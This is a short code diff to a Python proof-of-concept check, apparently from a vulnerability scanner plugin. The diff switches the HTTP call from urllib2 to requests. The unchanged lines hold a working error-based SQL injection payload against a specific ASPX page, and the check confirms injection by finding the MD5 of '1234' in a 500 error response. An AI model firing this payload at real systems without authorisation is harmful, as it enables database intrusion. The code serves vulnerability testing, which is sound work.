@@ -34,10 +34,9 @@ class Poc(ABPoc):
             
             payload = "/workplate/xzsp/gxxt/tjfx/dtl.aspx?id=76001&refnum=137&baseorg=209&flag=''&xksx=928+AND+1=sys.fn_varbintohexstr(hashbytes('MD5','1234'))-- "
             verify_url = self.target + payload
-            req = urllib2.Request(verify_url)
-            content = urllib2.urlopen(req).read()
+            req = requests.get(verify_url)
 
-            if req.getcode() == 500 and '81dc9bdb52d04dc20036dbd8313ed055' in content:
+            if req.status_code == 500 and '81dc9bdb52d04dc20036dbd8313ed055' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
